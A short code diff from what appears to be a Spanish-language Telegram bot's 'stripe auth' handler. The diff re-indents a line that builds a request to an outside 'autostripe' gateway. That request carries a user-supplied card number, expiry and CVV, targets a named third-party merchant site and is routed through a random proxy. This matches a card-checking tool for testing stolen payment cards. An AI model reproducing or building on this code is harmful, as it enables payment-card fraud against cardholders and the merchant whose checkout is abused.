@@ -82,7 +82,7 @@ def process_stripe_auth(bot, message):
         processing_msg = bot.reply_to(message, "🔄 Procesando tu tarjeta...")
         
         proxy = get_random_proxy()
-stripe_url = f"https://rockyysoon.onrender.com/gateway=autostripe/key=rockysoon?site=buildersdiscountwarehouse.com.au&cc={cc_number}|{expiry_month}|{formatted_year}|{cvv}&proxy={proxy}"
+        stripe_url = f"https://rockyysoon.onrender.com/gateway=autostripe/key=rockysoon?site=buildersdiscountwarehouse.com.au&cc={cc_number}|{expiry_month}|{formatted_year}|{cvv}&proxy={proxy}"
         # Hacer la solicitud simple con requests
         start_time = time.time()
         response = make_simple_request(stripe_url)
